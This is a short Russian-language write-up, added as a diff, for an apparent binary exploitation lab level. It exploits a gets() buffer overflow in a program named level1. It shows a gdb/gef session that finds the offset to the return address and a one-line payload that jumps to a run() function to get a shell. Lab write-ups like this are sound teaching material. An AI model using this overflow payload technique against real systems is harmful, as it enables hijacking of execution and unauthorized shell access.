@@ -1,0 +1,32 @@
+# Level 1 - простое переполнение
+
+### 1. В коде используется уязвимая к переполнению буфера функция gets().
+```c
+return (int) gets(s);
+```
+
+### 2. Подбираем нужный оффсет до адреса возврата и ret'аемся на функцию run, вызывающую шелл.
+
+```dart
+└─# gdb -q ./level1
+gef➤  pattern create
+[+] Generating a pattern of 1024 bytes (n=4)
+aaaabaaa...
+gef➤  start
+Breakpoint
+gef➤  c
+Continuing.
+aaaab/...
+[!] Cannot access memory at address 0x61616174
+gef➤  pattern search 0x61616174
+[+] Searching for '0x61616174'
+[+] Found at offset 76 (little-endian search) likely
+[+] Found at offset 73 (big-endian search)
+```
+
+Необходимый оффсет 76, адрес функции ```run()``` в ```little endian``` = " ```D\x84\x04\x08``` "
+
+### 3. Отправляем пейлоад на вход бинарного файла
+```c
+(echo -ne "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaD\x84\x04\x08"; cat)| ./level1
+```
